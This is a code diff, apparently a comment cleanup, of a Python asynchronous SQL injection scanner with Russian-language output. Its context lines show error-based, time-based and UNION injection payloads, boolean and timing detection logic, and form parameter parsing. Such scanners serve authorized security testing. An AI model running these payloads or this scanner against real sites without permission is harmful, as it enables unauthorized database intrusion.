@@ -104,7 +104,7 @@ class PayloadGenerator:
             "' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) -- ",
             "' AND 1=CONVERT(int,(SELECT @@VERSION)) -- ",
             "' AND 1=EXTRACTVALUE(1, CONCAT(0x5c, (SELECT USER()))) -- ",
-            "'; SELECT pg_sleep(0); --",  # PostgreSQL
+            "'; SELECT pg_sleep(0); --",
             " AND 1=1 AND 1=CAST(@@version AS INT) --",
         ]
 
@@ -135,7 +135,6 @@ class PayloadGenerator:
 
         for db, payloads in union_data.items():
             for i in range(len(payloads)):
-                # Упрощение для примера, предполагая 5 колонок для данных
                 payloads[i] = payloads[i].replace(nulls[:-5], ','.join(
                     ['NULL'] * (num_columns - 5)) + 'user')
 
@@ -228,7 +227,6 @@ class AnalysisEngine:
         similarity_true = self.compare_pages(original, true_resp)
         similarity_false = self.compare_pages(original, false_resp)
 
-        # True должен быть похож на Оригинал, а False — нет
         if similarity_true > 0.95 and similarity_false < 0.90:
             return True
         return False
@@ -238,7 +236,6 @@ class AnalysisEngine:
         avg_normal = statistics.mean(normal_times)
         avg_attack = statistics.mean(attack_times)
 
-        # Если атака замедлила сервер хотя бы на 2 секунды
         if len(normal_times) > 2:
             stdev = statistics.stdev(normal_times)
             threshold = avg_normal + max(3 * stdev, 2)
@@ -250,7 +247,6 @@ class AnalysisEngine:
                 return True
 
 
-# МОДУЛЬ 3: ASYNC CORE
 class AsyncScanner:
     def __init__(self, target_url, request_method='GET', initial_data=None, cookies=None):
         """Инициализация сканера. Поддерживает выбор метода GET/POST."""
@@ -335,7 +331,7 @@ class AsyncScanner:
     async def scan_time(self, session, param, original_val):
         print(f"[*] Проверка Time-Based ({self.request_method}) для параметра: {param}")
 
-        # 1. Сначала измеряем "нормальное" время отклика (Baseline)
+        # Сначала измеряем "нормальное" время отклика (Baseline)
         normal_times = []
         for _ in range(8):
             _, t = await self._fetch(session, self.all_params)
@@ -407,13 +403,13 @@ class AsyncScanner:
         }
 
         async with aiohttp.ClientSession(headers=headers, cookies=self.cookies) as session:
-            # 1. Получаем оригинал страницы (Baseline)
+            # Получаем оригинал страницы (Baseline)
             print("[*] Калибровка: получение оригинальной страницы...")
             original_html, _ = await self._fetch(session, self.all_params)
 
             tasks = []
 
-            # 2. Создаем задачи для каждого параметра
+            # Создаем задачи для каждого параметра
             for param in self.scan_params:
                 orig_val = self.all_params[param]
                 tasks.append(self.scan_error(session, param, orig_val))
@@ -422,7 +418,6 @@ class AsyncScanner:
 
             await asyncio.gather(*tasks)
 
-        # 4. Отчет
         print(f"\n{Colors.HEADER}=== ИТОГОВЫЙ ОТЧЕТ ==={Colors.ENDC}")
         if not self.vulnerabilities:
             print(f"{Colors.WARNING}Уязвимости не найдены.{Colors.ENDC}")
@@ -441,7 +436,7 @@ class AsyncScanner:
 async def _get_form_details(session, form_tag, base_url):
     """Парсит HTML-тег <form> и извлекает все необходимые данные для сканирования."""
 
-    # 1. Определяем URL назначения (action) и метод
+    # Определяем URL назначения (action) и метод
     action = form_tag.get('action') or base_url
     target_url = urljoin(base_url, action)
     method = form_tag.get('method', 'GET').upper()
@@ -579,7 +574,7 @@ if __name__ == "__main__":
 
     scan_performed = False
 
-    # 1. СКАНИРОВАНИЕ КЛАССИЧЕСКИХ GET-ПАРАМЕТРОВ
+    # СКАНИРОВАНИЕ КЛАССИЧЕСКИХ GET-ПАРАМЕТРОВ
     if '?' in input_url and urlparse(input_url).query:
         print(f"\n{Colors.HEADER}>>> ЭТАП А: КЛАССИЧЕСКОЕ СКАНИРОВАНИЕ GET-ПАРАМЕТРОВ <<< {Colors.ENDC}")
         try:
